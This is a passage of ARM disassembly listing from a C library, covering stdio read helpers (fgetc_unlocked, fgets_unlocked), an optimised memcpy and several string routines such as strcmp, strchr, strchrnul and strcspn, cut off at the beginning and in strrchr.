   1c650:	0a00000c 	beq	1c688 <__GI___fgetc_unlocked+0x114>
   1c654:	e5943014 	ldr	r3, [r4, #20]
   1c658:	e5843018 	str	r3, [r4, #24]
   1c65c:	e5943010 	ldr	r3, [r4, #16]
   1c660:	e4d30001 	ldrb	r0, [r3], #1
   1c664:	e5843010 	str	r3, [r4, #16]
   1c668:	ea000007 	b	1c68c <__GI___fgetc_unlocked+0x118>
   1c66c:	e1a00004 	mov	r0, r4
   1c670:	e28d1007 	add	r1, sp, #7
   1c674:	e3a02001 	mov	r2, #1
   1c678:	eb0003fe 	bl	1d678 <__stdio_READ>
   1c67c:	e3500000 	cmp	r0, #0
   1c680:	15dd0007 	ldrbne	r0, [sp, #7]
   1c684:	1a000000 	bne	1c68c <__GI___fgetc_unlocked+0x118>
   1c688:	e3e00000 	mvn	r0, #0
   1c68c:	e28dd00c 	add	sp, sp, #12
   1c690:	e8bd4030 	pop	{r4, r5, lr}
   1c694:	e12fff1e 	bx	lr
   1c698:	0000c3fc 	.word	0x0000c3fc
   1c69c:	0000004c 	.word	0x0000004c

0001c6a0 <__GI_fgets_unlocked>:
   1c6a0:	e92d40f0 	push	{r4, r5, r6, r7, lr}
   1c6a4:	e2516000 	subs	r6, r1, #0
   1c6a8:	e24dd004 	sub	sp, sp, #4
   1c6ac:	e1a07000 	mov	r7, r0
   1c6b0:	e1a04002 	mov	r4, r2
   1c6b4:	c1a05000 	movgt	r5, r0
   1c6b8:	ca000015 	bgt	1c714 <__GI_fgets_unlocked+0x74>
   1c6bc:	ea00001a 	b	1c72c <__GI_fgets_unlocked+0x8c>
   1c6c0:	e5942010 	ldr	r2, [r4, #16]
   1c6c4:	e5943018 	ldr	r3, [r4, #24]
   1c6c8:	e1520003 	cmp	r2, r3
   1c6cc:	2a000004 	bcs	1c6e4 <__GI_fgets_unlocked+0x44>
   1c6d0:	e4d23001 	ldrb	r3, [r2], #1
   1c6d4:	e4c53001 	strb	r3, [r5], #1
   1c6d8:	e353000a 	cmp	r3, #10
   1c6dc:	e5842010 	str	r2, [r4, #16]
   1c6e0:	ea00000a 	b	1c710 <__GI_fgets_unlocked+0x70>
   1c6e4:	e1a00004 	mov	r0, r4
   1c6e8:	ebffffa1 	bl	1c574 <__GI___fgetc_unlocked>
   1c6ec:	e3700001 	cmn	r0, #1
   1c6f0:	e20030ff 	and	r3, r0, #255	; 0xff
   1c6f4:	1a000003 	bne	1c708 <__GI_fgets_unlocked+0x68>
   1c6f8:	e1d430b0 	ldrh	r3, [r4]
   1c6fc:	e3130008 	tst	r3, #8
   1c700:	0a000005 	beq	1c71c <__GI_fgets_unlocked+0x7c>
   1c704:	ea000008 	b	1c72c <__GI_fgets_unlocked+0x8c>
   1c708:	e4c53001 	strb	r3, [r5], #1
   1c70c:	e353000a 	cmp	r3, #10
   1c710:	0a000001 	beq	1c71c <__GI_fgets_unlocked+0x7c>
   1c714:	e2566001 	subs	r6, r6, #1
   1c718:	1affffe8 	bne	1c6c0 <__GI_fgets_unlocked+0x20>
   1c71c:	e1550007 	cmp	r5, r7
   1c720:	83a03000 	movhi	r3, #0
   1c724:	85c53000 	strbhi	r3, [r5]
   1c728:	8a000000 	bhi	1c730 <__GI_fgets_unlocked+0x90>
   1c72c:	e3a07000 	mov	r7, #0
   1c730:	e1a00007 	mov	r0, r7
   1c734:	e28dd004 	add	sp, sp, #4
   1c738:	e8bd40f0 	pop	{r4, r5, r6, r7, lr}
   1c73c:	e12fff1e 	bx	lr

0001c740 <_memcpy>:
   1c740:	e1510000 	cmp	r1, r0
   1c744:	3a000092 	bcc	1c994 <_memcpy+0x254>
   1c748:	01a0f00e 	moveq	pc, lr
   1c74c:	e92d4001 	push	{r0, lr}
   1c750:	e2522004 	subs	r2, r2, #4
   1c754:	ba000020 	blt	1c7dc <_memcpy+0x9c>
   1c758:	e210c003 	ands	ip, r0, #3
   1c75c:	1a00002a 	bne	1c80c <_memcpy+0xcc>
   1c760:	e211c003 	ands	ip, r1, #3
   1c764:	1a000034 	bne	1c83c <_memcpy+0xfc>
   1c768:	e2522008 	subs	r2, r2, #8
   1c76c:	ba000012 	blt	1c7bc <_memcpy+0x7c>
   1c770:	e2522014 	subs	r2, r2, #20
   1c774:	ba00000b 	blt	1c7a8 <_memcpy+0x68>
   1c778:	e52d4004 	push	{r4}		; (str r4, [sp, #-4]!)
   1c77c:	e8b15018 	ldm	r1!, {r3, r4, ip, lr}
   1c780:	e8a05018 	stmia	r0!, {r3, r4, ip, lr}
   1c784:	e8b15018 	ldm	r1!, {r3, r4, ip, lr}
   1c788:	e8a05018 	stmia	r0!, {r3, r4, ip, lr}
   1c78c:	e2522020 	subs	r2, r2, #32
   1c790:	aafffff9 	bge	1c77c <_memcpy+0x3c>
   1c794:	e3720010 	cmn	r2, #16
   1c798:	a8b15018 	ldmge	r1!, {r3, r4, ip, lr}
   1c79c:	a8a05018 	stmiage	r0!, {r3, r4, ip, lr}
   1c7a0:	a2422010 	subge	r2, r2, #16
   1c7a4:	e49d4004 	pop	{r4}		; (ldr r4, [sp], #4)
   1c7a8:	e2922014 	adds	r2, r2, #20
   1c7ac:	a8b15008 	ldmge	r1!, {r3, ip, lr}
   1c7b0:	a8a05008 	stmiage	r0!, {r3, ip, lr}
   1c7b4:	a252200c 	subsge	r2, r2, #12
   1c7b8:	aafffffb 	bge	1c7ac <_memcpy+0x6c>
   1c7bc:	e2922008 	adds	r2, r2, #8
   1c7c0:	ba000005 	blt	1c7dc <_memcpy+0x9c>
   1c7c4:	e2522004 	subs	r2, r2, #4
   1c7c8:	b4913004 	ldrlt	r3, [r1], #4
   1c7cc:	b4803004 	strlt	r3, [r0], #4
   1c7d0:	a8b11008 	ldmge	r1!, {r3, ip}
   1c7d4:	a8a01008 	stmiage	r0!, {r3, ip}
   1c7d8:	a2422004 	subge	r2, r2, #4
   1c7dc:	e2922004 	adds	r2, r2, #4
   1c7e0:	08bd0009 	popeq	{r0, r3}
   1c7e4:	012fff13 	bxeq	r3
   1c7e8:	e3520002 	cmp	r2, #2
   1c7ec:	e4d13001 	ldrb	r3, [r1], #1
   1c7f0:	e4c03001 	strb	r3, [r0], #1
   1c7f4:	a4d13001 	ldrbge	r3, [r1], #1
   1c7f8:	a4c03001 	strbge	r3, [r0], #1
   1c7fc:	c4d13001 	ldrbgt	r3, [r1], #1
   1c800:	c4c03001 	strbgt	r3, [r0], #1
   1c804:	e8bd0009 	pop	{r0, r3}
   1c808:	e12fff13 	bx	r3
   1c80c:	e26cc004 	rsb	ip, ip, #4
   1c810:	e35c0002 	cmp	ip, #2
   1c814:	e4d13001 	ldrb	r3, [r1], #1
   1c818:	e4c03001 	strb	r3, [r0], #1
   1c81c:	a4d13001 	ldrbge	r3, [r1], #1
   1c820:	a4c03001 	strbge	r3, [r0], #1
   1c824:	c4d13001 	ldrbgt	r3, [r1], #1
   1c828:	c4c03001 	strbgt	r3, [r0], #1
   1c82c:	e052200c 	subs	r2, r2, ip
   1c830:	baffffe9 	blt	1c7dc <_memcpy+0x9c>
   1c834:	e211c003 	ands	ip, r1, #3
   1c838:	0affffca 	beq	1c768 <_memcpy+0x28>
   1c83c:	e3c11003 	bic	r1, r1, #3
   1c840:	e491e004 	ldr	lr, [r1], #4
   1c844:	e35c0002 	cmp	ip, #2
   1c848:	ca000036 	bgt	1c928 <_memcpy+0x1e8>
   1c84c:	0a00001a 	beq	1c8bc <_memcpy+0x17c>
   1c850:	e352000c 	cmp	r2, #12
   1c854:	ba000010 	blt	1c89c <_memcpy+0x15c>
   1c858:	e242200c 	sub	r2, r2, #12
   1c85c:	e92d0030 	push	{r4, r5}
   1c860:	e1a0342e 	lsr	r3, lr, #8
   1c864:	e8b15030 	ldm	r1!, {r4, r5, ip, lr}
   1c868:	e1833c04 	orr	r3, r3, r4, lsl #24
   1c86c:	e1a04424 	lsr	r4, r4, #8
   1c870:	e1844c05 	orr	r4, r4, r5, lsl #24
   1c874:	e1a05425 	lsr	r5, r5, #8
   1c878:	e1855c0c 	orr	r5, r5, ip, lsl #24
   1c87c:	e1a0c42c 	lsr	ip, ip, #8
   1c880:	e18ccc0e 	orr	ip, ip, lr, lsl #24
   1c884:	e8a01038 	stmia	r0!, {r3, r4, r5, ip}
   1c888:	e2522010 	subs	r2, r2, #16
   1c88c:	aafffff3 	bge	1c860 <_memcpy+0x120>
   1c890:	e8bd0030 	pop	{r4, r5}
   1c894:	e292200c 	adds	r2, r2, #12
   1c898:	ba000005 	blt	1c8b4 <_memcpy+0x174>
   1c89c:	e1a0c42e 	lsr	ip, lr, #8
   1c8a0:	e491e004 	ldr	lr, [r1], #4
   1c8a4:	e18ccc0e 	orr	ip, ip, lr, lsl #24
   1c8a8:	e480c004 	str	ip, [r0], #4
   1c8ac:	e2522004 	subs	r2, r2, #4
   1c8b0:	aafffff9 	bge	1c89c <_memcpy+0x15c>
   1c8b4:	e2411003 	sub	r1, r1, #3
   1c8b8:	eaffffc7 	b	1c7dc <_memcpy+0x9c>
   1c8bc:	e352000c 	cmp	r2, #12
   1c8c0:	ba000010 	blt	1c908 <_memcpy+0x1c8>
   1c8c4:	e242200c 	sub	r2, r2, #12
   1c8c8:	e92d0030 	push	{r4, r5}
   1c8cc:	e1a0382e 	lsr	r3, lr, #16
   1c8d0:	e8b15030 	ldm	r1!, {r4, r5, ip, lr}
   1c8d4:	e1833804 	orr	r3, r3, r4, lsl #16
   1c8d8:	e1a04824 	lsr	r4, r4, #16
   1c8dc:	e1844805 	orr	r4, r4, r5, lsl #16
   1c8e0:	e1a05825 	lsr	r5, r5, #16
   1c8e4:	e185580c 	orr	r5, r5, ip, lsl #16
   1c8e8:	e1a0c82c 	lsr	ip, ip, #16
   1c8ec:	e18cc80e 	orr	ip, ip, lr, lsl #16
   1c8f0:	e8a01038 	stmia	r0!, {r3, r4, r5, ip}
   1c8f4:	e2522010 	subs	r2, r2, #16
   1c8f8:	aafffff3 	bge	1c8cc <_memcpy+0x18c>
   1c8fc:	e8bd0030 	pop	{r4, r5}
   1c900:	e292200c 	adds	r2, r2, #12
   1c904:	ba000005 	blt	1c920 <_memcpy+0x1e0>
   1c908:	e1a0c82e 	lsr	ip, lr, #16
   1c90c:	e491e004 	ldr	lr, [r1], #4
   1c910:	e18cc80e 	orr	ip, ip, lr, lsl #16
   1c914:	e480c004 	str	ip, [r0], #4
   1c918:	e2522004 	subs	r2, r2, #4
   1c91c:	aafffff9 	bge	1c908 <_memcpy+0x1c8>
   1c920:	e2411002 	sub	r1, r1, #2
   1c924:	eaffffac 	b	1c7dc <_memcpy+0x9c>
   1c928:	e352000c 	cmp	r2, #12
   1c92c:	ba000010 	blt	1c974 <_memcpy+0x234>
   1c930:	e242200c 	sub	r2, r2, #12
   1c934:	e92d0030 	push	{r4, r5}
   1c938:	e1a03c2e 	lsr	r3, lr, #24
   1c93c:	e8b15030 	ldm	r1!, {r4, r5, ip, lr}
   1c940:	e1833404 	orr	r3, r3, r4, lsl #8
   1c944:	e1a04c24 	lsr	r4, r4, #24
   1c948:	e1844405 	orr	r4, r4, r5, lsl #8
   1c94c:	e1a05c25 	lsr	r5, r5, #24
   1c950:	e185540c 	orr	r5, r5, ip, lsl #8
   1c954:	e1a0cc2c 	lsr	ip, ip, #24
   1c958:	e18cc40e 	orr	ip, ip, lr, lsl #8
   1c95c:	e8a01038 	stmia	r0!, {r3, r4, r5, ip}
   1c960:	e2522010 	subs	r2, r2, #16
   1c964:	aafffff3 	bge	1c938 <_memcpy+0x1f8>
   1c968:	e8bd0030 	pop	{r4, r5}
   1c96c:	e292200c 	adds	r2, r2, #12
   1c970:	ba000005 	blt	1c98c <_memcpy+0x24c>
   1c974:	e1a0cc2e 	lsr	ip, lr, #24
   1c978:	e491e004 	ldr	lr, [r1], #4
   1c97c:	e18cc40e 	orr	ip, ip, lr, lsl #8
   1c980:	e480c004 	str	ip, [r0], #4
   1c984:	e2522004 	subs	r2, r2, #4
   1c988:	aafffff9 	bge	1c974 <_memcpy+0x234>
   1c98c:	e2411001 	sub	r1, r1, #1
   1c990:	eaffff91 	b	1c7dc <_memcpy+0x9c>
   1c994:	e0811002 	add	r1, r1, r2
   1c998:	e0800002 	add	r0, r0, r2
   1c99c:	e2522004 	subs	r2, r2, #4
   1c9a0:	ba00001f 	blt	1ca24 <_memcpy+0x2e4>
   1c9a4:	e210c003 	ands	ip, r0, #3
   1c9a8:	1a000027 	bne	1ca4c <_memcpy+0x30c>
   1c9ac:	e211c003 	ands	ip, r1, #3
   1c9b0:	1a000030 	bne	1ca78 <_memcpy+0x338>
   1c9b4:	e2522008 	subs	r2, r2, #8
   1c9b8:	ba000011 	blt	1ca04 <_memcpy+0x2c4>
   1c9bc:	e92d4010 	push	{r4, lr}
   1c9c0:	e2522014 	subs	r2, r2, #20
   1c9c4:	ba000005 	blt	1c9e0 <_memcpy+0x2a0>
   1c9c8:	e9315018 	ldmdb	r1!, {r3, r4, ip, lr}
   1c9cc:	e9205018 	stmdb	r0!, {r3, r4, ip, lr}
   1c9d0:	e9315018 	ldmdb	r1!, {r3, r4, ip, lr}
   1c9d4:	e9205018 	stmdb	r0!, {r3, r4, ip, lr}
   1c9d8:	e2522020 	subs	r2, r2, #32
   1c9dc:	aafffff9 	bge	1c9c8 <_memcpy+0x288>
   1c9e0:	e3720010 	cmn	r2, #16
   1c9e4:	a9315018 	ldmdbge	r1!, {r3, r4, ip, lr}
   1c9e8:	a9205018 	stmdbge	r0!, {r3, r4, ip, lr}
   1c9ec:	a2422010 	subge	r2, r2, #16
   1c9f0:	e2922014 	adds	r2, r2, #20
   1c9f4:	a9315008 	ldmdbge	r1!, {r3, ip, lr}
   1c9f8:	a9205008 	stmdbge	r0!, {r3, ip, lr}
   1c9fc:	a242200c 	subge	r2, r2, #12
   1ca00:	e8bd4010 	pop	{r4, lr}
   1ca04:	e2922008 	adds	r2, r2, #8
   1ca08:	ba000005 	blt	1ca24 <_memcpy+0x2e4>
   1ca0c:	e2522004 	subs	r2, r2, #4
   1ca10:	b5313004 	ldrlt	r3, [r1, #-4]!
   1ca14:	b5203004 	strlt	r3, [r0, #-4]!
   1ca18:	a9311008 	ldmdbge	r1!, {r3, ip}
   1ca1c:	a9201008 	stmdbge	r0!, {r3, ip}
   1ca20:	a2422004 	subge	r2, r2, #4
   1ca24:	e2922004 	adds	r2, r2, #4
   1ca28:	01a0f00e 	moveq	pc, lr
   1ca2c:	e3520002 	cmp	r2, #2
   1ca30:	e5713001 	ldrb	r3, [r1, #-1]!
   1ca34:	e5603001 	strb	r3, [r0, #-1]!
   1ca38:	a5713001 	ldrbge	r3, [r1, #-1]!
   1ca3c:	a5603001 	strbge	r3, [r0, #-1]!
   1ca40:	c5713001 	ldrbgt	r3, [r1, #-1]!
   1ca44:	c5603001 	strbgt	r3, [r0, #-1]!
   1ca48:	e1a0f00e 	mov	pc, lr
   1ca4c:	e35c0002 	cmp	ip, #2
   1ca50:	e5713001 	ldrb	r3, [r1, #-1]!
   1ca54:	e5603001 	strb	r3, [r0, #-1]!
   1ca58:	a5713001 	ldrbge	r3, [r1, #-1]!
   1ca5c:	a5603001 	strbge	r3, [r0, #-1]!
   1ca60:	c5713001 	ldrbgt	r3, [r1, #-1]!
   1ca64:	c5603001 	strbgt	r3, [r0, #-1]!
   1ca68:	e052200c 	subs	r2, r2, ip
   1ca6c:	baffffec 	blt	1ca24 <_memcpy+0x2e4>
   1ca70:	e211c003 	ands	ip, r1, #3
   1ca74:	0affffce 	beq	1c9b4 <_memcpy+0x274>
   1ca78:	e3c11003 	bic	r1, r1, #3
   1ca7c:	e5913000 	ldr	r3, [r1]
   1ca80:	e35c0002 	cmp	ip, #2
   1ca84:	ba000036 	blt	1cb64 <_memcpy+0x424>
   1ca88:	0a00001a 	beq	1caf8 <_memcpy+0x3b8>
   1ca8c:	e352000c 	cmp	r2, #12
   1ca90:	ba000010 	blt	1cad8 <_memcpy+0x398>
   1ca94:	e242200c 	sub	r2, r2, #12
   1ca98:	e92d4030 	push	{r4, r5, lr}
   1ca9c:	e1a0e403 	lsl	lr, r3, #8
   1caa0:	e9311038 	ldmdb	r1!, {r3, r4, r5, ip}
   1caa4:	e18eec2c 	orr	lr, lr, ip, lsr #24
   1caa8:	e1a0c40c 	lsl	ip, ip, #8
   1caac:	e18ccc25 	orr	ip, ip, r5, lsr #24
   1cab0:	e1a05405 	lsl	r5, r5, #8
   1cab4:	e1855c24 	orr	r5, r5, r4, lsr #24
   1cab8:	e1a04404 	lsl	r4, r4, #8
   1cabc:	e1844c23 	orr	r4, r4, r3, lsr #24
   1cac0:	e9205030 	stmdb	r0!, {r4, r5, ip, lr}
   1cac4:	e2522010 	subs	r2, r2, #16
   1cac8:	aafffff3 	bge	1ca9c <_memcpy+0x35c>
   1cacc:	e8bd4030 	pop	{r4, r5, lr}
   1cad0:	e292200c 	adds	r2, r2, #12
   1cad4:	ba000005 	blt	1caf0 <_memcpy+0x3b0>
   1cad8:	e1a0c403 	lsl	ip, r3, #8
   1cadc:	e5313004 	ldr	r3, [r1, #-4]!
   1cae0:	e18ccc23 	orr	ip, ip, r3, lsr #24
   1cae4:	e520c004 	str	ip, [r0, #-4]!
   1cae8:	e2522004 	subs	r2, r2, #4
   1caec:	aafffff9 	bge	1cad8 <_memcpy+0x398>
   1caf0:	e2811003 	add	r1, r1, #3
   1caf4:	eaffffca 	b	1ca24 <_memcpy+0x2e4>
   1caf8:	e352000c 	cmp	r2, #12
   1cafc:	ba000010 	blt	1cb44 <_memcpy+0x404>
   1cb00:	e242200c 	sub	r2, r2, #12
   1cb04:	e92d4030 	push	{r4, r5, lr}
   1cb08:	e1a0e803 	lsl	lr, r3, #16
   1cb0c:	e9311038 	ldmdb	r1!, {r3, r4, r5, ip}
   1cb10:	e18ee82c 	orr	lr, lr, ip, lsr #16
   1cb14:	e1a0c80c 	lsl	ip, ip, #16
   1cb18:	e18cc825 	orr	ip, ip, r5, lsr #16
   1cb1c:	e1a05805 	lsl	r5, r5, #16
   1cb20:	e1855824 	orr	r5, r5, r4, lsr #16
   1cb24:	e1a04804 	lsl	r4, r4, #16
   1cb28:	e1844823 	orr	r4, r4, r3, lsr #16
   1cb2c:	e9205030 	stmdb	r0!, {r4, r5, ip, lr}
   1cb30:	e2522010 	subs	r2, r2, #16
   1cb34:	aafffff3 	bge	1cb08 <_memcpy+0x3c8>
   1cb38:	e8bd4030 	pop	{r4, r5, lr}
   1cb3c:	e292200c 	adds	r2, r2, #12
   1cb40:	ba000005 	blt	1cb5c <_memcpy+0x41c>
   1cb44:	e1a0c803 	lsl	ip, r3, #16
   1cb48:	e5313004 	ldr	r3, [r1, #-4]!
   1cb4c:	e18cc823 	orr	ip, ip, r3, lsr #16
   1cb50:	e520c004 	str	ip, [r0, #-4]!
   1cb54:	e2522004 	subs	r2, r2, #4
   1cb58:	aafffff9 	bge	1cb44 <_memcpy+0x404>
   1cb5c:	e2811002 	add	r1, r1, #2
   1cb60:	eaffffaf 	b	1ca24 <_memcpy+0x2e4>
   1cb64:	e352000c 	cmp	r2, #12
   1cb68:	ba000010 	blt	1cbb0 <_memcpy+0x470>
   1cb6c:	e242200c 	sub	r2, r2, #12
   1cb70:	e92d4030 	push	{r4, r5, lr}
   1cb74:	e1a0ec03 	lsl	lr, r3, #24
   1cb78:	e9311038 	ldmdb	r1!, {r3, r4, r5, ip}
   1cb7c:	e18ee42c 	orr	lr, lr, ip, lsr #8
   1cb80:	e1a0cc0c 	lsl	ip, ip, #24
   1cb84:	e18cc425 	orr	ip, ip, r5, lsr #8
   1cb88:	e1a05c05 	lsl	r5, r5, #24
   1cb8c:	e1855424 	orr	r5, r5, r4, lsr #8
   1cb90:	e1a04c04 	lsl	r4, r4, #24
   1cb94:	e1844423 	orr	r4, r4, r3, lsr #8
   1cb98:	e9205030 	stmdb	r0!, {r4, r5, ip, lr}
   1cb9c:	e2522010 	subs	r2, r2, #16
   1cba0:	aafffff3 	bge	1cb74 <_memcpy+0x434>
   1cba4:	e8bd4030 	pop	{r4, r5, lr}
   1cba8:	e292200c 	adds	r2, r2, #12
   1cbac:	ba000005 	blt	1cbc8 <_memcpy+0x488>
   1cbb0:	e1a0cc03 	lsl	ip, r3, #24
   1cbb4:	e5313004 	ldr	r3, [r1, #-4]!
   1cbb8:	e18cc423 	orr	ip, ip, r3, lsr #8
   1cbbc:	e520c004 	str	ip, [r0, #-4]!
   1cbc0:	e2522004 	subs	r2, r2, #4
   1cbc4:	aafffff9 	bge	1cbb0 <_memcpy+0x470>
   1cbc8:	e2811001 	add	r1, r1, #1
   1cbcc:	eaffff94 	b	1ca24 <_memcpy+0x2e4>

0001cbd0 <__GI_strcmp>:
   1cbd0:	e4d02001 	ldrb	r2, [r0], #1
   1cbd4:	e4d13001 	ldrb	r3, [r1], #1
   1cbd8:	e3520001 	cmp	r2, #1
   1cbdc:	21520003 	cmpcs	r2, r3
   1cbe0:	0afffffa 	beq	1cbd0 <__GI_strcmp>
   1cbe4:	e0420003 	sub	r0, r2, r3
   1cbe8:	e1a0f00e 	mov	pc, lr
   1cbec:	e1a00000 	nop			; (mov r0, r0)

0001cbf0 <__GI_strchr>:
   1cbf0:	e92d4070 	push	{r4, r5, r6, lr}
   1cbf4:	e20140ff 	and	r4, r1, #255	; 0xff
   1cbf8:	ea000005 	b	1cc14 <__GI_strchr+0x24>
   1cbfc:	e5d03000 	ldrb	r3, [r0]
   1cc00:	e1530004 	cmp	r3, r4
   1cc04:	0a000031 	beq	1ccd0 <__GI_strchr+0xe0>
   1cc08:	e3530000 	cmp	r3, #0
   1cc0c:	0a00002e 	beq	1cccc <__GI_strchr+0xdc>
   1cc10:	e2800001 	add	r0, r0, #1
   1cc14:	e3100003 	tst	r0, #3
   1cc18:	1afffff7 	bne	1cbfc <__GI_strchr+0xc>
   1cc1c:	e1843404 	orr	r3, r4, r4, lsl #8
   1cc20:	e1a05000 	mov	r5, r0
   1cc24:	e1836803 	orr	r6, r3, r3, lsl #16
   1cc28:	e4953004 	ldr	r3, [r5], #4
   1cc2c:	e59f00a4 	ldr	r0, [pc, #164]	; 1ccd8 <__GI_strchr+0xe8>
   1cc30:	e0232006 	eor	r2, r3, r6
   1cc34:	e082c000 	add	ip, r2, r0
   1cc38:	e59f109c 	ldr	r1, [pc, #156]	; 1ccdc <__GI_strchr+0xec>
   1cc3c:	e0830000 	add	r0, r3, r0
   1cc40:	e1e03003 	mvn	r3, r3
   1cc44:	e0233000 	eor	r3, r3, r0
   1cc48:	e1a0e001 	mov	lr, r1
   1cc4c:	e1e02002 	mvn	r2, r2
   1cc50:	e0031001 	and	r1, r3, r1
   1cc54:	e022200c 	eor	r2, r2, ip
   1cc58:	e3510000 	cmp	r1, #0
   1cc5c:	e002e00e 	and	lr, r2, lr
   1cc60:	1a000001 	bne	1cc6c <__GI_strchr+0x7c>
   1cc64:	e35e0000 	cmp	lr, #0
   1cc68:	0affffee 	beq	1cc28 <__GI_strchr+0x38>
   1cc6c:	e5553004 	ldrb	r3, [r5, #-4]
   1cc70:	e1530004 	cmp	r3, r4
   1cc74:	e2450004 	sub	r0, r5, #4
   1cc78:	0a000014 	beq	1ccd0 <__GI_strchr+0xe0>
   1cc7c:	e3530000 	cmp	r3, #0
   1cc80:	0a000011 	beq	1cccc <__GI_strchr+0xdc>
   1cc84:	e5553003 	ldrb	r3, [r5, #-3]
   1cc88:	e1530004 	cmp	r3, r4
   1cc8c:	e2800001 	add	r0, r0, #1
   1cc90:	0a00000e 	beq	1ccd0 <__GI_strchr+0xe0>
   1cc94:	e3530000 	cmp	r3, #0
   1cc98:	0a00000b 	beq	1cccc <__GI_strchr+0xdc>
   1cc9c:	e5d03001 	ldrb	r3, [r0, #1]
   1cca0:	e1530004 	cmp	r3, r4
   1cca4:	e2800001 	add	r0, r0, #1
   1cca8:	0a000008 	beq	1ccd0 <__GI_strchr+0xe0>
   1ccac:	e3530000 	cmp	r3, #0
   1ccb0:	0a000005 	beq	1cccc <__GI_strchr+0xdc>
   1ccb4:	e5d03001 	ldrb	r3, [r0, #1]
   1ccb8:	e1530004 	cmp	r3, r4
   1ccbc:	e2800001 	add	r0, r0, #1
   1ccc0:	0a000002 	beq	1ccd0 <__GI_strchr+0xe0>
   1ccc4:	e3530000 	cmp	r3, #0
   1ccc8:	1affffd6 	bne	1cc28 <__GI_strchr+0x38>
   1cccc:	e3a00000 	mov	r0, #0
   1ccd0:	e8bd4070 	pop	{r4, r5, r6, lr}
   1ccd4:	e12fff1e 	bx	lr
   1ccd8:	7efefeff 	.word	0x7efefeff
   1ccdc:	81010100 	.word	0x81010100

0001cce0 <__GI_strchrnul>:
   1cce0:	e92d4070 	push	{r4, r5, r6, lr}
   1cce4:	e20140ff 	and	r4, r1, #255	; 0xff
   1cce8:	ea000005 	b	1cd04 <__GI_strchrnul+0x24>
   1ccec:	e5d03000 	ldrb	r3, [r0]
   1ccf0:	e1530004 	cmp	r3, r4
   1ccf4:	0a000030 	beq	1cdbc <__GI_strchrnul+0xdc>
   1ccf8:	e3530000 	cmp	r3, #0
   1ccfc:	0a00002e 	beq	1cdbc <__GI_strchrnul+0xdc>
   1cd00:	e2800001 	add	r0, r0, #1
   1cd04:	e3100003 	tst	r0, #3
   1cd08:	1afffff7 	bne	1ccec <__GI_strchrnul+0xc>
   1cd0c:	e1843404 	orr	r3, r4, r4, lsl #8
   1cd10:	e1a05000 	mov	r5, r0
   1cd14:	e1836803 	orr	r6, r3, r3, lsl #16
   1cd18:	e4953004 	ldr	r3, [r5], #4
   1cd1c:	e59f00a0 	ldr	r0, [pc, #160]	; 1cdc4 <__GI_strchrnul+0xe4>
   1cd20:	e0232006 	eor	r2, r3, r6
   1cd24:	e082c000 	add	ip, r2, r0
   1cd28:	e59f1098 	ldr	r1, [pc, #152]	; 1cdc8 <__GI_strchrnul+0xe8>
   1cd2c:	e0830000 	add	r0, r3, r0
   1cd30:	e1e03003 	mvn	r3, r3
   1cd34:	e0233000 	eor	r3, r3, r0
   1cd38:	e1a0e001 	mov	lr, r1
   1cd3c:	e1e02002 	mvn	r2, r2
   1cd40:	e0031001 	and	r1, r3, r1
   1cd44:	e022200c 	eor	r2, r2, ip
   1cd48:	e3510000 	cmp	r1, #0
   1cd4c:	e002e00e 	and	lr, r2, lr
   1cd50:	1a000001 	bne	1cd5c <__GI_strchrnul+0x7c>
   1cd54:	e35e0000 	cmp	lr, #0
   1cd58:	0affffee 	beq	1cd18 <__GI_strchrnul+0x38>
   1cd5c:	e5553004 	ldrb	r3, [r5, #-4]
   1cd60:	e1530004 	cmp	r3, r4
   1cd64:	e2450004 	sub	r0, r5, #4
   1cd68:	0a000013 	beq	1cdbc <__GI_strchrnul+0xdc>
   1cd6c:	e3530000 	cmp	r3, #0
   1cd70:	0a000011 	beq	1cdbc <__GI_strchrnul+0xdc>
   1cd74:	e5553003 	ldrb	r3, [r5, #-3]
   1cd78:	e1530004 	cmp	r3, r4
   1cd7c:	e2800001 	add	r0, r0, #1
   1cd80:	0a00000d 	beq	1cdbc <__GI_strchrnul+0xdc>
   1cd84:	e3530000 	cmp	r3, #0
   1cd88:	0a00000b 	beq	1cdbc <__GI_strchrnul+0xdc>
   1cd8c:	e5d03001 	ldrb	r3, [r0, #1]
   1cd90:	e1530004 	cmp	r3, r4
   1cd94:	e2800001 	add	r0, r0, #1
   1cd98:	0a000007 	beq	1cdbc <__GI_strchrnul+0xdc>
   1cd9c:	e3530000 	cmp	r3, #0
   1cda0:	0a000005 	beq	1cdbc <__GI_strchrnul+0xdc>
   1cda4:	e5d03001 	ldrb	r3, [r0, #1]
   1cda8:	e1530004 	cmp	r3, r4
   1cdac:	e2800001 	add	r0, r0, #1
   1cdb0:	0a000001 	beq	1cdbc <__GI_strchrnul+0xdc>
   1cdb4:	e3530000 	cmp	r3, #0
   1cdb8:	1affffd6 	bne	1cd18 <__GI_strchrnul+0x38>
   1cdbc:	e8bd4070 	pop	{r4, r5, r6, lr}
   1cdc0:	e12fff1e 	bx	lr
   1cdc4:	7efefeff 	.word	0x7efefeff
   1cdc8:	81010100 	.word	0x81010100

0001cdcc <__GI_strcspn>:
   1cdcc:	e92d4070 	push	{r4, r5, r6, lr}
   1cdd0:	e1a04000 	mov	r4, r0
   1cdd4:	e1a06001 	mov	r6, r1
   1cdd8:	e3a05000 	mov	r5, #0
   1cddc:	ea000003 	b	1cdf0 <__GI_strcspn+0x24>
   1cde0:	ebffff82 	bl	1cbf0 <__GI_strchr>
   1cde4:	e3500000 	cmp	r0, #0
   1cde8:	1a000005 	bne	1ce04 <__GI_strcspn+0x38>
   1cdec:	e2855001 	add	r5, r5, #1
   1cdf0:	e5d43000 	ldrb	r3, [r4]
   1cdf4:	e2531000 	subs	r1, r3, #0
   1cdf8:	e1a00006 	mov	r0, r6
   1cdfc:	e2844001 	add	r4, r4, #1
   1ce00:	1afffff6 	bne	1cde0 <__GI_strcspn+0x14>
   1ce04:	e1a00005 	mov	r0, r5
   1ce08:	e8bd4070 	pop	{r4, r5, r6, lr}
   1ce0c:	e12fff1e 	bx	lr

0001ce10 <__GI_strrchr>:
   1ce10:	e92d4030 	push	{r4, r5, lr}
   1ce14:	e21140ff 	ands	r4, r1, #255	; 0xff
   1ce18:	e24dd004 	sub	sp, sp, #4
   1ce1c:	e1a03000 	mov	r3, r0
   1ce20:	13a05000 	movne	r5, #0
   1ce24:	1a000004 	bne	1ce3c <__GI_strrchr+0x2c>
   1ce28:	e1a01004 	mov	r1, r4
   1ce2c:	ebffff6f 	bl	1cbf0 <__GI_strchr>
   1ce30:	ea000007 	b	1ce54 <__GI_strrchr+0x44>
   1ce34:	e1a05000 	mov	r5, r0
